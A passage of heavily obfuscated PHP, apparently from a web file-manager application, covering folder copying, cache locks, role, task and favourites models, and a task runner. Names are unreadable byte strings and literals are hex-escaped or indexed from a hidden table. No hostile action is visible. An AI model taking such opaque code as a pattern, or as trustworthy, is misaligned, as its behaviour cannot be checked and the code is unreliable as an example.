$Í›ö‘µ€, &$Ìîƒƒ’, $Èˆì€”è) { $©Ç’á ¨ =& $_SERVER[‚ûòÉ˜ş]; $»ŠÕ© = $this->sourceInfoCache($ó¶«î); $õÓ©œÁƒ = $³·”°å->listPath($†Ê¬À»); $õÓ©œÁƒ = $õÓ©œÁƒ ? $õÓ©œÁƒ : array($©Ç’á ¨[93] => array(), $©Ç’á ¨[92] => array()); $€›³‘š = array_merge($õÓ©œÁƒ[$©Ç’á ¨[93]], $õÓ©œÁƒ[$©Ç’á ¨[92]]); $Ùã•Òü› = $this->_addFiles($³·”°å, $õÓ©œÁƒ[$©Ç’á ¨[93]], $Èˆì€”è); $«ûéÎÏ¬ = array(); foreach ($€›³‘š as &$Û•ÊÓ¥Å) { if (isset($Ùã•Òü›[$Û•ÊÓ¥Å[$©Ç’á ¨[42]]])) { $Û•ÊÓ¥Å = $Ùã•Òü›[$Û•ÊÓ¥Å[$©Ç’á ¨[42]]]; } $Û•ÊÓ¥Å[$©Ç’á ¨[461]] = $Û•ÊÓ¥Å[$©Ç’á ¨[43]] == $©Ç’á ¨[85]; $Û•ÊÓ¥Å[$©Ç’á ¨[462]] = substr(_get($Û•ÊÓ¥Å, $©Ç’á ¨[185], $©Ç’á ¨[12]), 0, 10); $Û•ÊÓ¥Å[$©Ç’á ¨[86]] = _get($Û•ÊÓ¥Å, $©Ç’á ¨[86], 0); $Û•ÊÓ¥Å[$©Ç’á ¨[517]] = _get($Û•ÊÓ¥Å, $©Ç’á ¨[517], 0); if (!isset($Û•ÊÓ¥Å[$©Ç’á ¨[646]]) && $Û•ÊÓ¥Å[$©Ç’á ¨[517]]) { $Ìîƒƒ’[$©Ç’á ¨[643]][] = $Û•ÊÓ¥Å[$©Ç’á ¨[517]]; } if ($Í›ö‘µ€) { $úÖ•©¨€ = $this->fileNameExistCache($ó¶«î, $Û•ÊÓ¥Å[$©Ç’á ¨[42]]); if ($úÖ•©¨€) { if ($Û•ÊÓ¥Å[$©Ç’á ¨[461]] || $Í›ö‘µ€ == REPEAT_SKIP) { continue; } if ($Í›ö‘µ€ == REPEAT_REPLACE) { $ü·ÒòÕú = $this->sourceInfoCache($úÖ•©¨€); $©ä¼ö«ª = $this->fileHistory($ü·ÒòÕú, $Û•ÊÓ¥Å[$©Ç’á ¨[517]], $Û•ÊÓ¥Å[$©Ç’á ¨[86]]); if ($©ä¼ö«ª) { $Ìîƒƒ’[$©Ç’á ¨[605]][] = $Û•ÊÓ¥Å[$©Ç’á ¨[517]]; } continue; } else { if ($Í›ö‘µ€ == REPEAT_RENAME) { $Û•ÊÓ¥Å[$©Ç’á ¨[42]] = $this->fileNameAutoCache($ó¶«î, $Û•ÊÓ¥Å[$©Ç’á ¨[42]], $Í›ö‘µ€, !1); } } } } if (!$Û•ÊÓ¥Å[$©Ç’á ¨[461]] && $Û•ÊÓ¥Å[$©Ç’á ¨[517]] == 0) { continue; } if (!$Û•ÊÓ¥Å[$©Ç’á ¨[461]] && $Û•ÊÓ¥Å[$©Ç’á ¨[517]]) { $Ìîƒƒ’[$©Ç’á ¨[605]][] = $Û•ÊÓ¥Å[$©Ç’á ¨[517]]; } $«ûéÎÏ¬[] = $this->_makeItemData($Û•ÊÓ¥Å, $»ŠÕ©, $Û•ÊÓ¥Å[$©Ç’á ¨[42]]); } unset($Û•ÊÓ¥Å); if (!empty($«ûéÎÏ¬)) { $this->addAll($«ûéÎÏ¬); $this->_childrenListSelect($ó¶«î); } $ ÕÃÉÖ = $this->_childrenList($ó¶«î); $ ÕÃÉÖ = array_to_keyvalue($ ÕÃÉÖ, $©Ç’á ¨[42]); foreach ($€›³‘š as $Û•ÊÓ¥Å) { $ü·ÒòÕú = $ ÕÃÉÖ[$Û•ÊÓ¥Å[$©Ç’á ¨[42]]]; $¬ôŸ“” = $ü·ÒòÕú[$©Ç’á ¨[191]]; $this->_copyApplyMeta($ü·ÒòÕú, $Ìîƒƒ’); if ($Û•ÊÓ¥Å[$©Ç’á ¨[43]] == $©Ç’á ¨[85]) { $Û•ÊÓ¥Å[$©Ç’á ¨[94]] = $³·”°å->getPathInner($Û•ÊÓ¥Å[$©Ç’á ¨[94]]); $this->_copyChildTo($³·”°å, $Û•ÊÓ¥Å[$©Ç’á ¨[94]], $¬ôŸ“”, $Í›ö‘µ€, $Ìîƒƒ’, $Èˆì€”è); } } } private function _addFiles($ß…³¥, $ŒË¢ÇíÑ, $Ä‘È¥ù) { $öç—÷‚Ë =& $_SERVER[‚ûòÉ˜ş]; if (!$ŒË¢ÇíÑ || count($ŒË¢ÇíÑ) == 0) { return array(); } $ÁÏŞÕ = array(); foreach ($ŒË¢ÇíÑ as &$×¾„») { Hook::trigger($öç—÷‚Ë[647], $×¾„»); $×¾„»[$öç—÷‚Ë[94]] = $ß…³¥->getPathInner($×¾„»[$öç—÷‚Ë[94]]); $ó†¸Í€à = $ß…³¥->hashSimple($×¾„»[$öç—÷‚Ë[94]]); $»ç°Ì° = $ß…³¥->hashMd5($×¾„»[$öç—÷‚Ë[94]]); if (strlen($»ç°Ì°) > 10 && !isset($ÁÏŞÕ[$»ç°Ì°])) { $ÁÏŞÕ[$»ç°Ì°] = array(); } $×¾„»[$öç—÷‚Ë[648]] = $ó†¸Í€à; $×¾„»[$öç—÷‚Ë[649]] = $»ç°Ì°; $ÁÏŞÕ[$»ç°Ì°][] =& $×¾„»; if (count($ÁÏŞÕ[$»ç°Ì°]) > 1) { $×¾„»[$öç—÷‚Ë[646]] = !0; } Hook::trigger($öç—÷‚Ë[650], $×¾„»); } unset($×¾„»); $˜ƒÄ”òÉ = array($öç—÷‚Ë[649] => array($öç—÷‚Ë[7], array_keys($ÁÏŞÕ))); $¼Ä°Ãé = Model($öç—÷‚Ë[651]); $Îîı¸­† = $¼Ä°Ãé->where($˜ƒÄ”òÉ)->select(); $Îîı¸­† = $Îîı¸­† ? $Îîı¸­† : array(); foreach ($Îîı¸­† as $¨õìĞæ) { if (!isset($ÁÏŞÕ[$¨õìĞæ[$öç—÷‚Ë[649]]])) { continue; } $ƒ®Ï‹¸ = $ÁÏŞÕ[$¨õìĞæ[$öç—÷‚Ë[649]]]; foreach ($ƒ®Ï‹¸ as &$×¾„») { $×¾„»[$öç—÷‚Ë[517]] = $¨õìĞæ[$öç—÷‚Ë[517]]; $×¾„»[$öç—÷‚Ë[646]] = !0; } unset($×¾„»); } $œå‚ªÆ» = array(); foreach ($ŒË¢ÇíÑ as $âüšÊÜ) { Hook::trigger($öç—÷‚Ë[652], $âüšÊÜ); if (isset($âüšÊÜ[$öç—÷‚Ë[646]]) && $âüšÊÜ[$öç—÷‚Ë[646]]) { Hook::trigger($öç—÷‚Ë[653], $âüšÊÜ); continue; } $Ãøíƒı = $ß…³¥->getPathInner($âüšÊÜ[$öç—÷‚Ë[94]]); $Ù¼§çî = $¼Ä°Ãé->addFileMake($Ãøíƒı, $âüšÊÜ[$öç—÷‚Ë[86]], $âüšÊÜ[$öç—÷‚Ë[648]], $âüšÊÜ[$öç—÷‚Ë[649]], $âüšÊÜ[$öç—÷‚Ë[42]], $Ä‘È¥ù); Hook::trigger($öç—÷‚Ë[653], $âüšÊÜ); if (!is_array($Ù¼§çî)) { continue; } $œå‚ªÆ»[] = $Ù¼§çî; } $¼Ä°Ãé->addAll($œå‚ªÆ»); $˜ƒÄ”òÉ = array($öç—÷‚Ë[649] => array($öç—÷‚Ë[7], array_keys($ÁÏŞÕ))); $Îîı¸­† = $¼Ä°Ãé->where($˜ƒÄ”òÉ)->select(); $Îîı¸­† = $Îîı¸­† ? $Îîı¸­† : array(); foreach ($Îîı¸­† as $¨õìĞæ) { if (!isset($ÁÏŞÕ[$¨õìĞæ[$öç—÷‚Ë[649]]])) { continue; } $¨ü—Â¿“ =& $ÁÏŞÕ[$¨õìĞæ[$öç—÷‚Ë[649]]]; foreach ($¨ü—Â¿“ as &$×¾„») { $×¾„»[$öç—÷‚Ë[517]] = $¨õìĞæ[$öç—÷‚Ë[517]]; } unset($×¾„»); } $Äë×ÔÂ = array(); foreach ($ŒË¢ÇíÑ as $–¹ë¼È¨) { $Äë×ÔÂ[$–¹ë¼È¨[$öç—÷‚Ë[42]]] = $–¹ë¼È¨; } return $Äë×ÔÂ; } } define($_SERVER[‚ûòÉ˜ş][654], $_SERVER[‚ûòÉ˜ş][655]); $giwmfpcquh = $_SERVER[‚ûòÉ˜ş][656]; goto bôíŒ©Âƒ; E«õÔŠóÁØ: class CacheLockMemcached { public function lock($šÃåƒöÖ, $Û·”ÍõÅ = 0) { $ıØ’ĞÖß = Cache::init(); $‰Ö°íá× = microtime(!0) + $Û·”ÍõÅ; while (microtime(!0) < $‰Ö°íá×) { $æóÀÜ»Ş = $ıØ’ĞÖß->get($šÃåƒöÖ); if (!$æóÀÜ»Ş || $æóÀÜ»Ş < microtime(!0)) { $—¸¢ÁğŒ = $ıØ’ĞÖß->handle->add($šÃåƒöÖ, $‰Ö°íá×, $Û·”ÍõÅ); if ($—¸¢ÁğŒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¼¦Ö©‰˜) { return Cache::init()->get($¼¦Ö©‰˜); } public function unlock($ïˆæı×™) { return Cache::init()->remove($ïˆæı×™); } } class CacheLockDatabase { public function lock($Û³‡Ñàı, $û¤Şº¶ç = 0) { $—Ç€ƒÔˆ = Model($_SERVER[‚ûòÉ˜ş][869]); $Ù­›†Î = microtime(!0) + $û¤Şº¶ç; while (microtime(!0) < $Ù­›†Î) { $Ô‡“±ƒÖ = $—Ç€ƒÔˆ->get($Û³‡Ñàı); if (!$Ô‡“±ƒÖ || $Ô‡“±ƒÖ < microtime(!0)) { $” ¯ÏËó = $—Ç€ƒÔˆ->set($Û³‡Ñàı, $Ù­›†Î); if ($” ¯ÏËó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¥šÈ˜•Ü) { return Model($_SERVER[‚ûòÉ˜ş][869])->get($¥šÈ˜•Ü); } public function unlock($««ô÷¶ğ) { Model($_SERVER[‚ûòÉ˜ş][869])->remove($««ô÷¶ğ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($®ç ¿Œ, $¶ùé§Íî) { $Áâ—²ñÄ =& $_SERVER[‚ûòÉ˜ş]; if (!class_exists($Áâ—²ñÄ[907])) { show_json($Áâ—²ñÄ[908], !1); } $this->cacheTime = $¶ùé§Íî; $this->handle = new Memcached(); if (is_array($®ç ¿Œ[$Áâ—²ñÄ[909]]) && count($®ç ¿Œ[$Áâ—²ñÄ[909]]) >= 1) { foreach ($®ç ¿Œ[$Áâ—²ñÄ[909]] as $® ôÇ†ï) { $ºôÂ»ºÔ = explode($Áâ—²ñÄ[4], $® ôÇ†ï); $this->handle->addServer($ºôÂ»ºÔ[0], $ºôÂ»ºÔ[1]); } } else { $this->handle->addServer($®ç ¿Œ[$Áâ—²ñÄ[206]], $®ç ¿Œ[$Áâ—²ñÄ[207]]); } } public function set($Û¡·¹Ë, $äÍø·ãò, $€’ëÓª© = false) { $€’ëÓª© = $€’ëÓª© ? $€’ëÓª© : $this->cacheTime; return $this->handle->set($Û¡·¹Ë, $äÍø·ãò, $€’ëÓª©); } public function get($„Ç×íç„) { return $this->handle->get($„Ç×íç„); } public function remove($¿°òÚ»‹) { return $this->handle->delete($¿°òÚ»‹); } public function deleteAll() { return $this->handle->flush(); } } goto Cä…ÅĞö¶¶; F‡Ğ¡Ùé‰˜: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x72\157\154\145\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x61\165\164\x68", "\x6c\141\x62\145\154", "\144\151\163\160\x6c\x61\171", "\x73\x79\x73\164\x65\155", "\144\145\x73\x63", "\x69\x67\x6e\x6f\x72\x65\x45\170\164", "\x69\147\156\157\162\145\x46\151\x6c\x65\123\x69\x7a\145", "\x61\x64\x6d\151\156\x69\163\164\x72\x61\x74\157\162", "\x73\x6f\162\x74"); public function listData($›·ÏÜ¨ø = false, $¿‡¡ÆêÑ = "\x73\157\162\x74", $ìÚ÷ÄË§ = false) { $ÔúØ»Õô =& $_SERVER[‚ûòÉ˜ş]; $Â•™°šı = parent::listData($›·ÏÜ¨ø, $¿‡¡ÆêÑ, $ìÚ÷ÄË§); if (!$›·ÏÜ¨ø) { foreach ($Â•™°šı as $Ö„üÜª‰ => $£ÂàÈ“ª) { if ($£ÂàÈ“ª[$ÔúØ»Õô[2087]] == 1) { $Â•™°šı[$Ö„üÜª‰][$ÔúØ»Õô[502]] = LNG($ÔúØ»Õô[2326]); } } } return $Â•™°šı; } public function update($ÎËªµø, $¢Š²Ùè°) { $ºÀ®ÀÅ =& $_SERVER[‚ûòÉ˜ş]; $‘ñù‚” = parent::listData($ÎËªµø); $£ŠÉİÕØ = $this->findByName($¢Š²Ùè°[$ºÀ®ÀÅ[42]]); if (!$‘ñù‚” || $£ŠÉİÕØ && $£ŠÉİÕØ[$ºÀ®ÀÅ[451]] != $‘ñù‚”[$ºÀ®ÀÅ[451]]) { return !1; } if ($£ŠÉİÕØ[$ºÀ®ÀÅ[2087]] == 1) { $¢Š²Ùè° = array($ºÀ®ÀÅ[42] => $¢Š²Ùè°[$ºÀ®ÀÅ[42]], $ºÀ®ÀÅ[1908] => $¢Š²Ùè°[$ºÀ®ÀÅ[1908]]); } $this->filterAuth($¢Š²Ùè°[$ºÀ®ÀÅ[463]]); return parent::update($ÎËªµø, $¢Š²Ùè°); } public function remove($ÙÒ‡ÒË) { $¼©«ï•Š = parent::listData($ÙÒ‡ÒË); if (!$¼©«ï•Š || $¼©«ï•Š[$_SERVER[‚ûòÉ˜ş][189]]) { return !1; } return parent::remove($ÙÒ‡ÒË); } public function add($éšæİ˜ø) { $‹ºì‡Ø¬ =& $_SERVER[‚ûòÉ˜ş]; $ÅçÕÉÅÓ = $éšæİ˜ø[$‹ºì‡Ø¬[42]]; if ($this->findByName($ÅçÕÉÅÓ)) { return !1; } $¤¡õş³Ù = array($‹ºì‡Ø¬[470] => $ÅçÕÉÅÓ, $‹ºì‡Ø¬[1891] => $‹ºì‡Ø¬[12], $‹ºì‡Ø¬[1887] => $‹ºì‡Ø¬[1895], $‹ºì‡Ø¬[2327] => 1, $‹ºì‡Ø¬[1890] => 0, $‹ºì‡Ø¬[2328] => 0, $‹ºì‡Ø¬[1889] => $this->getSort()); $éšæİ˜ø = array_merge($¤¡õş³Ù, $éšæİ˜ø); $this->filterAuth($éšæİ˜ø[$‹ºì‡Ø¬[463]]); return parent::insert($éšæİ˜ø); } private function getSort() { $¼ÕÇù®É =& $_SERVER[‚ûòÉ˜ş]; $¯Úí‹õ = parent::listData(); $’í­ˆËõ = array_to_keyvalue($¯Úí‹õ, $¼ÕÇù®É[12], $¼ÕÇù®É[1909]); return empty($’í­ˆËõ) ? 0 : max($’í­ˆËõ) + 1; } private function filterAuth(&$¯ı•ÂÙ®) { $ÖÎ‘Ã—‰ =& $_SERVER[‚ûòÉ˜ş]; $š”‚°Œ¡ = array(); $—Êº«ù§ = array_filter(explode($ÖÎ‘Ã—‰[60], $¯ı•ÂÙ®)); foreach ($—Êº«ù§ as $¯ı•ÂÙ®) { $°§˜í×Œ = explode($ÖÎ‘Ã—‰[10], $¯ı•ÂÙ®); if ($°§˜í×Œ[0] == $ÖÎ‘Ã—‰[2329] && $°§˜í×Œ[1] != $ÖÎ‘Ã—‰[1231]) { $¹¸­ƒ“ = $°§˜í×Œ[0] . $ÖÎ‘Ã—‰[10] . $°§˜í×Œ[1] . $ÖÎ‘Ã—‰[2330]; if (!in_array($¹¸­ƒ“, $—Êº«ù§)) { $š”‚°Œ¡[] = $¹¸­ƒ“; } } $š”‚°Œ¡[] = $¯ı•ÂÙ®; } $¯ı•ÂÙ® = implode($ÖÎ‘Ã—‰[60], $š”‚°Œ¡); } public function findRoleDefault() { $ıí¿§—Ë =& $_SERVER[‚ûòÉ˜ş]; $“•è×à… = parent::listData(); $é’ÈÂà = !1; foreach ($“•è×à… as $ƒŸÖå‡¨) { if (!$ƒŸÖå‡¨ || $ƒŸÖå‡¨[$ıí¿§—Ë[1907]] == $ıí¿§—Ë[222] || $ƒŸÖå‡¨[$ıí¿§—Ë[2087]] == 1) { continue; } if (strstr($ƒŸÖå‡¨[$ıí¿§—Ë[463]], $ıí¿§—Ë[2331])) { continue; } if (!strstr($ƒŸÖå‡¨[$ıí¿§—Ë[463]], $ıí¿§—Ë[2332])) { continue; } if (!$é’ÈÂà) { $é’ÈÂà = $ƒŸÖå‡¨; continue; } $í³ ñ¢ú = explode($ıí¿§—Ë[60], $é’ÈÂà[$ıí¿§—Ë[463]]); $‡ş¡ì™‘ = explode($ıí¿§—Ë[60], $ƒŸÖå‡¨[$ıí¿§—Ë[463]]); if (count($í³ ñ¢ú) > count($‡ş¡ì™‘)) { $é’ÈÂà = $ƒŸÖå‡¨; } } return $é’ÈÂà ? $é’ÈÂà[$ıí¿§—Ë[451]] : $ıí¿§—Ë[12]; } public function sort($å‚÷’“, $Æğ–”) { return parent::update($å‚÷’“, $Æğ–”); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\164\x61\163\x6b\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x74\171\160\x65", "\145\x76\145\156\164", "\x74\151\x6d\145", "\144\145\163\x63", "\x73\171\163\x74\x65\155", "\x65\156\141\x62\154\145", "\x6c\141\x73\x74\122\165\x6e", "\163\157\x72\164"); public function listData($ğ•Î‰Ï„ = false, $·ôãé†ö = "\163\x6f\162\x74", $Å²Æ¯±ë = false) { return parent::listData($ğ•Î‰Ï„, $·ôãé†ö, $Å²Æ¯±ë); } public function add($¥¦¬Ìêà) { $À–àÈÊ =& $_SERVER[‚ûòÉ˜ş]; $®—øö•€ = $this->findByName($¥¦¬Ìêà[$À–àÈÊ[42]]); if ($®—øö•€) { return !1; } $¥¦¬Ìêà[$À–àÈÊ[1644]] = 0; $¥¦¬Ìêà[$À–àÈÊ[1909]] = $this->getSort(); return parent::insert($¥¦¬Ìêà); } private function getSort() { $Áı™ú² =& $_SERVER[‚ûòÉ˜ş]; $¡“Œ¼¬¥ = parent::listData(); $àßìªŒ™ = array_to_keyvalue($¡“Œ¼¬¥, $Áı™ú²[12], $Áı™ú²[1909]); return empty($àßìªŒ™) ? 0 : max($àßìªŒ™) + 1; } public function update($“‰ÓÕî€, $îûŠƒÕ¿) { $ü£´õÍ =& $_SERVER[‚ûòÉ˜ş]; $‚»¿ıœ• = $this->listData($“‰ÓÕî€); $ÆÙñ½ÕŒ = $this->findByName($îûŠƒÕ¿[$ü£´õÍ[42]]); if (!$‚»¿ıœ• || $ÆÙñ½ÕŒ && $ÆÙñ½ÕŒ[$ü£´õÍ[451]] != $‚»¿ıœ•[$ü£´õÍ[451]]) { return !1; } return parent::update($“‰ÓÕî€, $îûŠƒÕ¿); } public function remove($§÷œ‰Æ¿, $»•‚ÇİÚ = false) { $È»ş¡’ =& $_SERVER[‚ûòÉ˜ş]; $í†ÕˆÚ = $this->listData($§÷œ‰Æ¿); if (!$í†ÕˆÚ) { return; } if (!$»•‚ÇİÚ && $í†ÕˆÚ[$È»ş¡’[189]] == $È»ş¡’[98]) { return !1; } return parent::remove($§÷œ‰Æ¿); } public function enable($íµúÊÍ˜, $î˜ÕÌ¹) { return $this->update($íµúÊÍ˜, array($_SERVER[‚ûòÉ˜ş][2321] => $î˜ÕÌ¹)); } public function run($«ºëöú‘) { return $this->update($«ºëöú‘, array($_SERVER[‚ûòÉ˜ş][2333] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($ú ñÁÆ½) { $ğä©é¢… =& $_SERVER[‚ûòÉ˜ş]; return array($ğä©é¢…[1996] => array(USER_ID, $ğä©é¢…[2334])); } protected function listData() { $ö–£Ì–è =& $_SERVER[‚ûòÉ˜ş]; $ß¤œ¸Ûë = array($ö–£Ì–è[1678] => USER_ID, $ö–£Ì–è[533] => 0); $¤…©½¡° = $ö–£Ì–è[2335]; $ËÌ¥ƒ½¡ = $this->field($¤…©½¡°)->where($ß¤œ¸Ûë)->order($ö–£Ì–è[2336])->select(); return $ËÌ¥ƒ½¡ ? $ËÌ¥ƒ½¡ : array(); } protected function resetCache() { } protected function listView() { $Èôàé“Ç =& $_SERVER[‚ûòÉ˜ş]; $³Š©ôÄÚ = $this->listData(); $ñËÆÇËÙ = array_filter_by_field($³Š©ôÄÚ, $Èôàé“Ç[43], $Èôàé“Ç[466]); $‹ØŸúí = array_to_keyvalue($ñËÆÇËÙ, $Èôàé“Ç[12], $Èôàé“Ç[94]); if (!$‹ØŸúí) { return $³Š©ôÄÚ; } $“òÆ½©• = 2000; $¬ÇÈòÑÙ = array($Èôàé“Ç[467] => array($Èôàé“Ç[468], $‹ØŸúí)); $ÒÆ¶×Á = Model($Èôàé“Ç[865])->listSource($¬ÇÈòÑÙ, $“òÆ½©•); $ÒÆ¶×Á = array_merge($ÒÆ¶×Á[$Èôàé“Ç[93]], $ÒÆ¶×Á[$Èôàé“Ç[92]]); $ÒÆ¶×Á = array_to_keyvalue($ÒÆ¶×Á, $Èôàé“Ç[191]); foreach ($³Š©ôÄÚ as $ÑöÙšæÄ => $˜Ú º±£) { $óè½ã…· = $ÒÆ¶×Á[$˜Ú º±£[$Èôàé“Ç[94]]]; $óè½ã…· = $óè½ã…· ? $óè½ã…· : array(); $³Š©ôÄÚ[$ÑöÙšæÄ] = array_merge($óè½ã…·, $˜Ú º±£); } return $³Š©ôÄÚ; } protected function addFav($Óö²Æ¥¨, $Ì×ÁÚüï = '', $ÇÎ¢ì”· = "\x73\x6f\165\x72\x63\145") { $‡¾– =& $_SERVER[‚ûòÉ˜ş]; $ã‡ÂüÃÓ = array($‡¾–[1678] => USER_ID, $‡¾–[533] => 0, $‡¾–[472] => $ÇÎ¢ì”·, $‡¾–[471] => $Óö²Æ¥¨); if ($this->where($ã‡ÂüÃÓ)->find()) { return !1; } $ã‡ÂüÃÓ = array($‡¾–[1678] => USER_ID, $‡¾–[533] => 0); $ª«Ú­— = $this->where($ã‡ÂüÃÓ)->max($‡¾–[1909]); if (!$ª«Ú­—) { $ª«Ú­— = 0; } if (!$Ì×ÁÚüï && $ÇÎ¢ì”· == $‡¾–[466]) { $±³µåÁ© = Model($‡¾–[1373])->where(array($‡¾–[467] => $Óö²Æ¥¨))->find(); if (!$±³µåÁ©) { return !1; } $Ì×ÁÚüï = $±³µåÁ©[$‡¾–[42]]; } $Ì×ÁÚüï = $this->getAutoName($Ì×ÁÚüï); $ÅøöÑÍÒ = array($‡¾–[1678] => USER_ID, $‡¾–[533] => 0, $‡¾–[470] => $Ì×ÁÚüï, $‡¾–[471] => $Óö²Æ¥¨, $‡¾–[472] => $ÇÎ¢ì”·, $‡¾–[1889] => $ª«Ú­— + 1); return $this->add($ÅøöÑÍÒ); } protected function remove($ı‚õ“°ú) { $µ€·Õ±ˆ =& $_SERVER[‚ûòÉ˜ş]; $éåœªîÀ = array($µ€·Õ±ˆ[1678] => USER_ID, $µ€·Õ±ˆ[469] => $ı‚õ“°ú); return $this->where($éåœªîÀ)->delete(); } protected function removeByName($ÔÇü› ¨) { $Ê‡‘àüï =& $_SERVER[‚ûòÉ˜ş]; $¼Îò´õå = array($Ê‡‘àüï[1678] => USER_ID, $Ê‡‘àüï[470] => $ÔÇü› ¨, $Ê‡‘àüï[533] => 0); return $this->where($¼Îò´õå)->delete(); } protected function rename($°¨Ñ¨, $Ø›º£‰) { $ëƒüûôô =& $_SERVER[‚ûòÉ˜ş]; if ($°¨Ñ¨ == $Ø›º£‰) { return !1; } $œÜÄ‹„† = $this->getAutoName($Ø›º£‰); if ($Ø›º£‰ != $œÜÄ‹„†) { return !1; } $Û”òÅ¥ = array($ëƒüûôô[1678] => USER_ID, $ëƒüûôô[533] => 0, $ëƒüûôô[42] => $°¨Ñ¨); return $this->where($Û”òÅ¥)->save(array($ëƒüûôô[42] => $Ø›º£‰)); } protected function resetSort($á¢ ×›§) { $¶†û‚‹é =& $_SERVER[‚ûòÉ˜ş]; $á¢ ×›§ = is_array($á¢ ×›§) ? $á¢ ×›§ : array(); $Ÿşç…¡ = array($¶†û‚‹é[1678] => USER_ID); for ($µ³Î®¬Ì = 0; $µ³Î®¬Ì < count($á¢ ×›§); $µ³Î®¬Ì++) { $Ÿşç…¡[$¶†û‚‹é[469]] = $á¢ ×›§[$µ³Î®¬Ì]; $this->where($Ÿşç…¡)->save(array($¶†û‚‹é[1889] => $µ³Î®¬Ì + 1)); } return !0; } protected function moveTop($•Ã­Öüş) { $ò™‹ÔßÒ =& $_SERVER[‚ûòÉ˜ş]; $€ÔÃÂ”ş = array($ò™‹ÔßÒ[1678] => USER_ID, $ò™‹ÔßÒ[533] => 0); $àáïßêŠ = $this->where($€ÔÃÂ”ş)->where(array($ò™‹ÔßÒ[42] => $•Ã­Öüş))->find(); if (!$àáïßêŠ) { return; } $½•µã‰ = $this->field($ò™‹ÔßÒ[451])->where($€ÔÃÂ”ş)->order($ò™‹ÔßÒ[2336])->select(); $½•µã‰ = array_to_keyvalue($½•µã‰, $ò™‹ÔßÒ[12], $ò™‹ÔßÒ[451]); $¬½˜ÁœÄ = $½•µã‰; $½•µã‰ = array_remove_value($½•µã‰, $àáïßêŠ[$ò™‹ÔßÒ[451]]); array_unshift($½•µã‰, $àáïßêŠ[$ò™‹ÔßÒ[451]]); return $this->resetSort($½•µã‰); } protected function moveBottom($¸ÛÒ‡ç) { $ú¨¸ ¹¹ =& $_SERVER[‚ûòÉ˜ş]; $Ä®öˆ¿­ = array($ú¨¸ ¹¹[1678] => USER_ID, $ú¨¸ ¹¹[533] => 0); $µ–¿èşİ = $this->where($Ä®öˆ¿­)->max($ú¨¸ ¹¹[1909]); $­‰ÌŞš¸ = array($ú¨¸ ¹¹[1909] => $µ–¿èşİ + 1); return $this->where($Ä®öˆ¿­)->where(array($ú¨¸ ¹¹[42] => $¸ÛÒ‡ç))->save($­‰ÌŞš¸); } private function getAutoName($÷»ô€šÉ) { $¿¸Ú•ã =& $_SERVER[‚ûòÉ˜ş]; $³‡Âã¯¢ = array($¿¸Ú•ã[1678] => USER_ID, $¿¸Ú•ã[533] => 0); $•¯¬™Ç¾ = $this->field($¿¸Ú•ã[42])->where($³‡Âã¯¢)->select(); $•¯¬™Ç¾ = array_to_keyvalue($•¯¬™Ç¾, $¿¸Ú•ã[12], $¿¸Ú•ã[42]); if (!$•¯¬™Ç¾ || !in_array($÷»ô€šÉ, $•¯¬™Ç¾)) { return $÷»ô€šÉ; } for ($£§™Î„Ç = 0; $£§™Î„Ç < count($•¯¬™Ç¾); $£§™Î„Ç++) { if (!in_array($÷»ô€šÉ . "\50{$£§™Î„Ç}\x29", $•¯¬™Ç¾)) { return $÷»ô€šÉ . "\50{$£§™Î„Ç}\51"; } } return $÷»ô€šÉ . "\x28{$£§™Î„Ç}\x29"; } } goto BÊ½İ§øì’; Dß‘ÊïËÕè: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÂÖÊ´–Û, $±ÄÌÜ¥© = 5.0) { if (!$ÂÖÊ´–Û) { return; } $ôö×ø¹ç = Cache::get($ÂÖÊ´–Û); if (!$ôö×ø¹ç || timeFloat() - floatVal($ôö×ø¹ç) >= $±ÄÌÜ¥©) { Cache::set($ÂÖÊ´–Û, timeFloat(), $±ÄÌÜ¥© * 10); return !0; } return !1; } public static function timeLimitCall($æ€àş²‰, $ÊÜ²½‰¼, $°öÆ„ˆ¯, $‚£ê¸ß = 5.0) { $úùû¢®÷ =& $_SERVER[‚ûòÉ˜ş]; if (!$æ€àş²‰ || !$ÊÜ²½‰¼) { return; } self::$asyncAdd = !0; $éÛÜŸŸ¨ = $úùû¢®÷[1793]; $®ö¸ü¥° = Cache::get($éÛÜŸŸ¨, !0); $ÊÚÓ–…Ğ = array($úùû¢®÷[1794] => timeFloat(), $úùû¢®÷[1795] => timeFloat(), $úùû¢®÷[317] => $ÊÜ²½‰¼, $úùû¢®÷[1785] => $°öÆ„ˆ¯, $úùû¢®÷[204] => $‚£ê¸ß); if (is_array($®ö¸ü¥°[$æ€àş²‰])) { $ÊÚÓ–…Ğ[$úùû¢®÷[1795]] = $®ö¸ü¥°[$æ€àş²‰][$úùû¢®÷[1795]]; } if (is_array($®ö¸ü¥°[$æ€àş²‰])) { if (timeFloat() - $®ö¸ü¥°[$æ€àş²‰][$úùû¢®÷[1794]] < $ÊÚÓ–…Ğ[$úùû¢®÷[204]] * 0.3) { return; } $ÊÚÓ–…Ğ[$úùû¢®÷[1795]] = $®ö¸ü¥°[$æ€àş²‰][$úùû¢®÷[1795]]; } $®ö¸ü¥°[$æ€àş²‰] = $ÊÚÓ–…Ğ; Cache::set($éÛÜŸŸ¨, $®ö¸ü¥°, 60); Cache::removeMemory($éÛÜŸŸ¨); write_log($úùû¢®÷[1796] . $æ€àş²‰ . $úùû¢®÷[81] . $ÊÜ²½‰¼, $úùû¢®÷[195]); } public static function timeLimitCallLoop() { $´‹¨§ˆÀ =& $_SERVER[‚ûòÉ˜ş]; $ä‹ˆ¥ÖÒ = array($´‹¨§ˆÀ[1797]); $¨Š‡˜Ù = in_array(strtolower(ACTION), $ä‹ˆ¥ÖÒ); if (!$¨Š‡˜Ù && !self::$asyncAdd) { return; } $ÄóæßÍø = $´‹¨§ˆÀ[1793]; $â¹” = Cache::get($ÄóæßÍø, !0); if (!$â¹” || count($â¹”) <= 0) { return; } $¨Üõ“›ç = !1; $–Ÿåãè¿ = timeFloat(); $ç§’É©Æ = array(); foreach ($â¹” as $ÅÕ±©¡Ö => $ªÁŸË˜) 